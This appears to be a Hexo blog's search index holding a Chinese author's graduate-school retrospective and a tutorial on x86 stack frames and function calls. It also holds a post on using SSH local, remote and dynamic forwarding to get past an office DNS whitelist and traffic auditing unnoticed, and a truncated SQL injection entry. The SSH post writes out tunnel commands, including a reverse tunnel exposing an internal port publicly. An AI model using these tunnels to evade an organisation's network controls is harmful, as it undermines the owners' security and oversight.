<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>研究生三年我都做了什么</title>
      <link href="/yanjiusheng3year.html"/>
      <url>/yanjiusheng3year.html</url>
      
        <content type="html"><![CDATA[<p>我是LuckyFuture，距离上一篇文章发布（2022-9-24）已经过去905天了。硕士生活已经进入尾声，今天我重新打开博客来回答三个问题：</p><ol><li>研究生3年我都做了什么？</li><li>为什么很久没有更新博客了？</li><li>为什么又开始更新博客了？</li><li>未来打算。</li></ol><h3 id="研究生3年我都做了什么？"><a href="#研究生3年我都做了什么？" class="headerlink" title="研究生3年我都做了什么？"></a>研究生3年我都做了什么？</h3><p>首先回答第一个问题，研究生3年我都做了什么？</p><p>在大学本科阶段我对于自身所在的信息安全专业投入了很多精力，这些投入不仅是在学校的专业课程上，还包括最新的实用的企业招聘所需要的专业技术、国内网络安全企业的运营模式拆解分析、以及大量的实习、护网和CTF比赛。不太谦虚的来讲，对于网络安全行业，相比于本专业大多数的毕业生，我的了解要更深入一些。而这份深入全面的了解，带给来认知就是：我还没有做好进入工作环境的准备。直白点来说，我目前的能力不能够支撑实现我的想法。所以，即便是被调剂学校录取我也是满意的，因为又给了我三年的时间来提升自己。</p><p>将时间调回2022年9月，我刚刚开始读研生活。在暑假期间自己联系了导师，进入了以网络安全为为研究方向的实验室，结识了yhy zyh两位师兄，后面这两人对我的影响可以说是读研期间最大的收获。</p><p>硕士生活刚开始，我的思路很直接：选择pwn方向，专心提升技术实力，在CTF大赛上取得名次，发表高水平论文，最终凭借比赛名次和论文入职甲方单位或乙方的技术研究岗位。于是我开始着手准备参加2023年的国赛，通过yhy的引荐，我联系到了本校CTF社团的负责人和老师，在同届中找到了web手，很快组织起了一支队伍开始备赛，上一篇文章<a href="https://luckyfuture.top/StackAndFuncCall.html%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%9C%A8%E9%82%A3%E6%97%B6%E5%86%99%E4%B8%8B%E7%9A%84%E3%80%82%E5%A6%82%E6%9E%9C%E6%8C%89%E7%85%A7%E5%B8%B8%E8%A7%84%E6%83%85%E8%8A%82%E5%8F%91%E5%B1%95%E4%B8%8B%E5%8E%BB%EF%BC%8C%E6%88%91%E4%BD%9C%E4%B8%BACTF%E7%95%8C%E7%9A%84%E8%80%81%E8%B5%84%E5%8E%86%E9%80%89%E6%89%8B%EF%BC%8C%E6%88%96%E8%AE%B8%E8%83%BD%E5%A4%9F%E8%BF%B8%E5%8F%91%E5%87%BA%E6%96%B0%E7%9A%84%E7%81%AB%E8%8A%B1%EF%BC%8C%E6%88%90%E4%B8%BA%E7%9C%9F%E6%AD%A3%E7%9A%84pwn">https://luckyfuture.top/StackAndFuncCall.html，就是在那时写下的。如果按照常规情节发展下去，我作为CTF界的老资历选手，或许能够迸发出新的火花，成为真正的pwn</a> master。</p><p>但是事实是，我的pwn技术提升的很慢。高情商的解释的是，我在这一方面缺乏天赋；低情商的说法就是，根本学不进去，yhy推荐的网课小半年看了不到10节，刷题时间更是没有保障。最终2023的国赛我们取得了省三等奖，2024年国赛由于每个学校只能入围两只队伍，在校内我们排名第三，无缘线下赛。与我们2022年一同获得三等奖的本科生队伍，如今已经入围决赛，取得全国前20名的优异成绩。时至今日不得不承认，在ctf比赛，或者说技术钻研方面，我的能力是欠缺的。</p><p>就这样，读研后有关CTF的设想到此终结。</p><p>专业技术的学习告一段落，到了2023年研究生二年级，我的重心转移到了科研论文上来，yhy在毕业前帮我点明了方向：二进制软件成分分析。经过了阅读论文调研后，我认定这这个方向有着巨大的实用价值，并且掌握的pwn基础知识使我具备了直接开展研究的能力。</p><p>经过暑假的大量阅读文献调研，我确定了研究的创新点：多模态对比学习预训练+特定任务微调。当时最火的就是以CLIP为代表的多模态大模型（题外话，当时AI专家认为多模态是下一个风口，2022年底发布的chatgpt让LLM成为了全世界的焦点），而我将CLIP的思路迁移到了自然语言处理上。事实证明我对于最新技术感知相当准确，仅仅是三个月后，清华大学张超团队成果在软件工程顶会ISSTA发表，同年腾讯科恩实验室的成果在ICSE发表，前者设计了二进制与自然语言对齐任务，后者设计了二进制与源代码的对齐任务。抱着对自身能力的信心，我将目标设为了信息安全四大顶会，或者中文CCF A类期刊。</p><p>论文写作过程并不顺利，现在回想起来，做实验反而是最轻松的部分。因为实验需要用到大显存的专业计算显卡，我租赁了云服务平台。一轮训练需要八九个小时，通常是晚上调好代码然后训练，第二天早上看结果，继续尝试思路再训练，周而复始了半个月，我构想并实现了很多奇妙的训练方法，直到关键指标无法再提升。我发现运用编程做原始的功能实现，这是属于我的强项，不用考虑性能、执行效率，只关注能否实现实际的需求。这或许与我先前写poc和exp的经历有关，我曾经对算法不以为意，认为那是工程思维，而网络安全需要的是创造性思维。两者都是解决问题，前者试图在有解的情况下找到最优解，后者则是在无解的情况下给出解。</p><p>实验完成后便开始了论文写作，在这一阶段我花费了巨大的精力。将一份简洁明了技术实现报告，变成一篇“逻辑性强”的学术论文，就是我在干的事情。技术终究是清晰明了、简单直接的，但传统的学术论文充斥的空洞的概念、不明所以的前缀、浮夸的包装。我并非不会写论文，只是觉得研究生不应该把这么多的精力放到文字表达上。我经常看B站up主耿同学讲故事，不禁开始怀疑所谓的科研是否都是在糊弄。从学术的角度来讲，我们实验室每年的成果是十分顶级的，但是从学术价值的角度来讲，我们做的真的是科研吗？恐怕不好评价。</p><p>反复的修改让我对自己的论文失去信心，但是投稿后很快又找了回来，期刊给出审稿意见十分简单，简单修改后予以录用。虽然带着对自己付出精力的怀疑，论文录用还是让我十分开心。毕竟满足了毕业条件，而且确实是一篇CCF A类期刊，完成了先前的计划。</p><p>论文的事情落定后，秋招开始了。我制定了两个对于工作单位的要求：信息技术行业的大型国有企业或科研院所事业单位，信息安全岗位。事实证明我对今年的就业形式过于乐观了，纵使我对自己的能力抱有自信，但上述类型的单位大部分甚至给不了一个面试的机会。不过在zyh的推荐下，一家单位给了我机会，工作内容虽然和预期有所偏差，但是如果将选择只限定到北京而言，已经是很不错的结果。</p><h3 id="为什么很久不更新博客？"><a href="#为什么很久不更新博客？" class="headerlink" title="为什么很久不更新博客？"></a>为什么很久不更新博客？</h3><p>上一次博客更新还是研究生刚刚入学的时候，那时的我觉得选定了一个方向就能够坚持的走下去。但实际上研究生这三年里，我想做的事情一直在变化。况且这个这个博客设计之初是希望分享一些技术内容，最关键的是，在读研究生的这三年当中我在安全技术上其实是没有太多提升的，曾经的选定的二进制pwn学习、web安全漏洞复现、免杀工具编写，这些内容再我刚刚开始做的时候反响很好，也收到了很多人的鼓励，但是最终都没有坚持下来。</p><p>我想这也是我的一大缺点，做事缺乏恒心和毅力，或者说遇到一点小的变动打乱了部署，就不想再继续进行下去了。有人说这种情况是完美主义在作祟，回想起来我在一些事情上确实是过于追求完美了，有时甚至觉得做不好，就不如不去做。带着这种心态做事的结果就是，在事情开始之前我就被畏难情绪给打败了，很多时候我宁可去拖延，也不愿意将事情开始着手去做，等到最后时间不足，不得不草草收尾，周而复始陷入更大的内耗循环之中。</p><p>在更新博客这个问题上我就陷入了这种怪圈，一方面我希望去整理输出分享一些内容，但是很多次都觉得自己的工作很微不足道没有分享意义，我总是想着完成了这件事情，就把心得体会总结分享一下，但是真到了提笔去写的时候又觉得乏善可陈，到最后的结果就是一篇博客也没有写出来。</p><h3 id="为什么又开始更新博客？"><a href="#为什么又开始更新博客？" class="headerlink" title="为什么又开始更新博客？"></a>为什么又开始更新博客？</h3><p>因为我意识到自己这个心态是很不好的。我想尝试去克服去改变这个心态。曾经有很长一段时间，我不更新朋友圈。同样是觉得自己没有做成一件令人瞩目的事情没有什么值得分享的但是实际上呢，我是一个分享欲望十分强烈的人。我还是希望去把自己生活中。一些感悟。一些见闻。或者是一些好玩的事情。分享给身边的人。所以我在微博和小红书上更新的频率很高。我逐渐地意识到：即使是简单的日常生活，也同样有记录的意义。所以说微博和小红书我拿来记录生活。一些工作和学习上的感悟。我希望通过这个博客来记录。</p><p>还有一个原因是我没事的时候经常去看博客的留言板，我发现我分享的内容得到很多人的认可。我本人确实非常喜欢这种感觉，希望能有这么一个地方能够与志同道合的人一起交流，这样看来继续把博客做下去就是最好的选择。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/20250325232806355.png" alt="image-20250325204804169"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/20250325232837412.png" alt="image-20250325204916650"></p><h3 id="未来打算"><a href="#未来打算" class="headerlink" title="未来打算"></a>未来打算</h3><p>最关键的就是博客未来的定位，以后我在这里要分享什么内容。</p><p>第一类内容，就是我工作当中的一些见闻，我目前将视角转到的安全合规这个方向上来，未来会分享一些对行业的认识和看法，对安全产品和技术的学习笔记。</p><p>第二类内容，是我自己的兴趣爱好，比如摄影，捣鼓新生产力软件工具等。</p><p>第三类内容，就是像这篇文章这样的日记随笔，记录成长过程中的感悟。</p><p>除了内容的问题，还有就是博客形式的问题。目前基于leancloud的评论系统似乎不能匿名使用了，评论区也是我写博客的一大动力，所以这个问题得尽快解决。此外，Hexo的发布修改删除必须要在安装nodejs环境下的电脑上使用命令行来操作，不能使用后台随时管理，和现在更流行的博客系统相比，这一点略微有些麻烦，后续可能会考虑更换平台，或者优化发布流程。</p><p>以上，就是这段时间来我想说的所有内容，很高兴和大家再次相逢，重新出发。</p>]]></content>
      
      
      <categories>
          
          <category> 日记随想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈和函数调用(详细版)</title>
      <link href="/StackAndFuncCall.html"/>
      <url>/StackAndFuncCall.html</url>
      
        <content type="html"><![CDATA[<p>栈是计算机中最重要、最基础的数据结构之一，它是一个先入后出的数据结构。在一个编译完成的二进制程序中，栈的空间总是有限的。简单说，Stack 是由于函数运行而临时占用的内存区域。在Linux上，可以使用命令“ulimit -a”查看或更改当前系统默认的栈大小。</p><p>操作栈的常用指令是PUSH和POP，即入栈和出栈。</p><p>有两个特殊的寄存器用于栈操作</p><ul><li>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li><li>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push xxx    #使esp值减去4位或8位，将操作数写入esp指向的内存中。</span><br><span class="line">pop xxx     #从esp指向的内存中读取数据写入其它地址或寄存器，再将esp值加4或8位。</span><br></pre></td></tr></table></figure><p>用一段程序展示栈在函数调用中操作过程</p><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">callee</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b ,<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a+b+c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ret;</span><br><span class="line">  ret = callee(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">  ret+= <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># gcc -m32 -fno-stack-protector -no-pie ./hello.c -o test </span><br><span class="line"># objdump -d -M intel test</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">08049196 &lt;main&gt;:</span><br><span class="line"> 8049196:f3 0f 1e fb          endbr32 </span><br><span class="line"> 804919a:55                   push   ebp</span><br><span class="line"> 804919b:89 e5                mov    ebp,esp</span><br><span class="line"> 804919d:83 ec 10             sub    esp,0x10</span><br><span class="line"> 80491aa:6a 03                push   0x3</span><br><span class="line"> 80491ac:6a 02                push   0x2</span><br><span class="line"> 80491ae:6a 01                push   0x1</span><br><span class="line"> 80491b0:e8 c1 ff ff ff       call   8049176 &lt;callee&gt;</span><br><span class="line"> 80491b5:83 c4 0c             add    esp,0xc</span><br><span class="line"> 80491b8:89 45 fc             mov    DWORD PTR [ebp-0x4],eax</span><br><span class="line"> 80491bb:83 45 fc 04          add    DWORD PTR [ebp-0x4],0x4</span><br><span class="line"> 80491bf:8b 45 fc             mov    eax,DWORD PTR [ebp-0x4]</span><br><span class="line"> 80491c2:c9                   leave  </span><br><span class="line"> 80491c3:c3                   ret </span><br><span class="line"> </span><br><span class="line">08049176 &lt;callee&gt;:</span><br><span class="line"> 8049176:f3 0f 1e fb          endbr32 </span><br><span class="line"> 804917a:55                   push   ebp</span><br><span class="line"> 804917b:89 e5                mov    ebp,esp</span><br><span class="line"> 8049187:8b 55 08             mov    edx,DWORD PTR [ebp+0x8]</span><br><span class="line"> 804918a:8b 45 0c             mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line"> 804918d:01 c2                add    edx,eax</span><br><span class="line"> 804918f:8b 45 10             mov    eax,DWORD PTR [ebp+0x10]</span><br><span class="line"> 8049192:01 d0                add    eax,edx</span><br><span class="line"> 8049194:5d                   pop    ebp</span><br><span class="line"> 8049195:c3                   ret    </span><br></pre></td></tr></table></figure><p>为了方便叙述，将main函数称为父函数，callee为子函数，main的上一层函数为爷爷函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08049196 &lt;main&gt;:</span><br><span class="line"> 8049196:f3 0f 1e fb          endbr32 </span><br><span class="line"> 804919a:55                   push   ebp</span><br><span class="line"> 804919b:89 e5                mov    ebp,esp</span><br></pre></td></tr></table></figure><p>这段汇编代码将爷爷函数的ebp指针值入栈保存，后面恢复爷爷函数栈状态的时候会用到。所有的函数开头都要执行这两行指令，来保存调用函数的栈状态。执行后栈状态如下。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923225820423.png" alt="image-20220923225820423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">804919d:83 ec 10             sub    esp,0x10     //esp指针值减0x10</span><br><span class="line">80491aa:6a 03                push   0x3    // 参数0x3入栈，esp指针值减0x4</span><br><span class="line">80491ac:6a 02                push   0x2//参数0x2入栈 esp指针值减0x4</span><br><span class="line">80491ae:6a 01                push   0x1//参数0x1入栈 esp指针值减0x4</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923231400332.png" alt="image-20220923231400332"></p><p>进入重点，call指令</p><p>CALL指令调用某个子函数时，下一条指令的地址作为返回地址被保存到栈中，等价于PUSH返回地址与JMP函数地址的指令序列。即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push eip</span><br><span class="line">jmp func_addr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80491b0:e8 c1 ff ff ff       call   8049176 &lt;callee&gt;</span><br></pre></td></tr></table></figure><p>执行后先将下一条地址 <code>80491b5</code>入栈，随后跳转到子函数执行。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923232023393.png" alt="image-20220923232023393"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">08049176 &lt;callee&gt;:</span><br><span class="line"> 8049176:f3 0f 1e fb          endbr32 </span><br><span class="line"> 804917a:55                   push   ebp</span><br><span class="line"> 804917b:89 e5                mov    ebp,esp</span><br></pre></td></tr></table></figure><p>保存父函数的esp指针</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923232710201.png" alt="image-20220923232710201"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8049187:8b 55 08             mov    edx,DWORD PTR [ebp+0x8]</span><br><span class="line">804918a:8b 45 0c             mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">804918d:01 c2                add    edx,eax</span><br><span class="line">804918f:8b 45 10             mov    eax,DWORD PTR [ebp+0x10]</span><br><span class="line">8049192:01 d0                add    eax,edx</span><br></pre></td></tr></table></figure><p>这段指令完成<code>a+b+c</code>的操作，通过ebp偏移从栈中取操作数，将运算结果放到eax寄存器中。栈无变化。</p><p>被调用函数结束时，程序将执行RET指令跳转到这个返回地址，将控制权交还给调用函数，等价于POP返回地址与JMP返回地址的指令序列。因此无论调用了多少层子函数，由于栈后入先出的特性，程序控制权最终会回到main函数。即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br><span class="line">jmp return_addr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8049194:5d                   pop    ebp//将栈顶值出栈到ebp中，esp+4</span><br><span class="line">8049195:c3                   ret    //pop eip, esp+4</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923233741531.png" alt="image-20220923233741531"></p><p>回到main函数中继续执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80491b5:83 c4 0c             add    esp,0xc// esp + 0xc</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923234132965.png" alt="image-20220923234132965"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80491b8:89 45 fc             mov    DWORD PTR [ebp-0x4],eax//[ebp-0x4] = eax</span><br><span class="line">80491bb:83 45 fc 04          add    DWORD PTR [ebp-0x4],0x4//[ebp-0x4] = [ebp-0x4] + 0x4</span><br><span class="line">80491bf:8b 45 fc             mov    eax,DWORD PTR [ebp-0x4]//eax = [ebp-0x4]</span><br></pre></td></tr></table></figure><p>完成<code>ret += 4</code>的操作</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923234721970.png" alt="image-20220923234721970"></p><p>leave指令将EBP寄存器的内容复制到ESP寄存器中，以释放分配给该过程的所有堆栈空间。然后，它从堆栈恢复EBP寄存器的旧值。即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp//将ebp指向（ebp内部应当保存一个地址，所谓指向即这个地址对应的空间）的值赋给esp</span><br><span class="line">pop ebp </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80491c2:c9                   leave  </span><br><span class="line">80491c3:c3                   ret  //pop eip, esp + 4</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220923235650993.png" alt="image-20220923235650993"></p><p>至此分配给程序的栈空间全部收回，控制权回到爷爷函数的控制下。继续执行。</p><p>结束。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建SSH隧道绕过防火墙</title>
      <link href="/ssh-tunnel.html"/>
      <url>/ssh-tunnel.html</url>
      
        <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>来到办公室第一天发现虽然有无线网，但是公司把对github，博客园，B站以及各种论坛的访问都切断了。最离奇的是<a href="https://luckyfuture.top/config-clash-on-linux.html">我的Clash代理</a>竟然也无法正常工作。</p><p>仔细研究了一下，发现所有请求先经过内网DNS服务器，并且有全流量设备对请求进行审计。审计规则是域名白名单策略，所有不在白名单内的域名，都会被DNS服务器拒绝。</p><p>而Clash代理配置的机场正是通过域名连接的，这就解释为什么clash也无法正常工作。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220805010952623-165964047055514.png" alt="image-20220805010952623"></p><p>但是直接访问IP是不受限制的，由此我想可以在自己的云服务器上开启一个web代理，这样可以绕过DNS服务器访问外部网络。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本机浏览器 -- 云服务器代理服务器 -- 外部网络</span><br></pre></td></tr></table></figure><h3 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h3><p>实现代理服务器有很多种方式，我先使用<a href="https://sparkydogx.github.io/2018/11/20/tinyproxy/">Tinyproxy</a>工具搭建了一个简单的代理。并且Tinyproxy支持socks代理，可以将流量继续向上游转发。这样一来就可以和云服务器上的clash联动起来，实现对墙外网络的访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Tinyproxy配置socks代理</span><br><span class="line">upstream socks5 127.0.0.1:7891</span><br></pre></td></tr></table></figure><p>然而我使用手机热点测试一切正常，切换到办公室wifi网络却无法工作。Tinyproxy只支持http协议，而公司的路由似乎对http协议做了某些限制，在本机执行curl命令连接都会被重置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luckyfuture@aaa MINGW64 ~</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl http://xxx.xx.xxx.xxx:2333/ddd</span></span><br><span class="line">curl: (56) Recv failure: Connection was reset</span><br></pre></td></tr></table></figure><p>所有http协议的代理就无法使用了，转头去寻找其它代理工具。其实在内网渗透中，在靶机上配置隧道穿透和代理转发的是基本操作，也有很多工具类似frp，Venom可供使用。只是我担心这些工具的流量会被公司内网的各种安全设备检测到告警，被领导发现搭隧道上外网摸鱼就尴尬了。</p><h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><p>我突然想到ssh的流量是端到端加密的，并且使用ssh也是正常业务范畴，应该不会引起注意。能不能搭建一条SSH隧道呢？</p><p>上网一查真的可以，<a href="https://www.cnblogs.com/zlingh/p/15635870.html">ssh命令除了登陆外还有代理转发功能</a>。只不过网上的教程讲的云山雾罩，看了好几遍才明白我所在场景该怎么操作。下面总结一下。</p><p>SSH一共提供了3种端口转发，分别是本地转发（-L参数）、远程转发（-R参数）和动态转发（-D参数)</p><p>为方便叙述规定如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HostA 本地主机 在内网</span><br><span class="line">HostB 云服务器 在公网</span><br><span class="line">HostC 另一台主机 和HostB相通 和HostA不通</span><br><span class="line">以下所有命令无说明都在HostA上执行</span><br></pre></td></tr></table></figure><ul><li>本地转发（-L参数）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L HostA:PORTA:HostC:PORTC root@HostB</span><br></pre></td></tr></table></figure><p>这条命令的作用是将HostC:PORTC通过HostB的代理映射到HostA:PORTA上来。实现不互通主机之间的端口映射。</p><p>我们的需求就可以用这条命令实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -fN -L 0.0.0.0:7001:127.0.0.1:7891 root@xxx.xx.x.x</span><br></pre></td></tr></table></figure><p>对于HostB来说127.0.0.1就是自己。所以这条命令的结果，是将云服务器上的7891端口映射到本地的7001端口。在浏览器中配置代理，所有的流量都会经过ssh转发到云服务器的7891端口也就是clash的监听端口去处理。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220805023215771-165964047055615.png" alt="image-20220805023215771"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器 -- 本地7001 -- ssh -- 云服务器7891</span><br></pre></td></tr></table></figure><ul><li>远程转发（-R参数）</li></ul><p>使用前需要在HostB 的 /etc/ssh/sshd_config配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R HostC:PORTC:HostA:PORTA user@HostB</span><br></pre></td></tr></table></figure><p>这条命令的作用是将HostA:PORTA的流量经过HostB代理转发到HostC:PORTC上，实际使用中，HostB和HostC可以是同一台主机。这就实现了内网穿透，将HostA:PORTA映射到了公网。</p><blockquote><p>内网穿透十分危险，在工作环境中慎重使用。出了问题轻则被辞退，重则吃牢饭。</p></blockquote><p>举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -fN -R 0.0.0.0:12345:127.0.0.1:80 root@hostB</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220805024823562-165964047055616.png" alt="image-20220805024823562"></p><p>将本地80端口映射到云服务器12345端口。便可以在公网访问内网web服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器 -- 云服务器12345 -- ssh -- 内网80</span><br></pre></td></tr></table></figure><ul><li>动态转发（-D参数)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D PORTA user@HostB</span><br></pre></td></tr></table></figure><p>这条命令在本机PORTA创建了一个SOCKS代理，所有通过该SOCKS代理发出的数据包将经过HostB转发出去。</p><p>这条命令实现一个最简单的代理隧道，在HostA浏览器里设置使用socks5代理127.0.0.1:PORTA，然后浏览器就可以访问hostB所在网络内的任何IP了。我们的需求也可以用这条命令实现，只不过不能和clash联动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器 --- 本机port --- ssh --- 流量转发</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>愉快使用办公室wifi摸鱼。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220805010154456.png" alt="image-20220805010154456"></p><blockquote><p>参考资料<br><a href="https://github.com/st286/SSH-port-forwarding">https://github.com/st286/SSH-port-forwarding</a><br><a href="https://www.cnblogs.com/zlingh/p/15635870.html">https://www.cnblogs.com/zlingh/p/15635870.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/sqli-summary.html"/>
      <url>/sqli-summary.html</url>
      
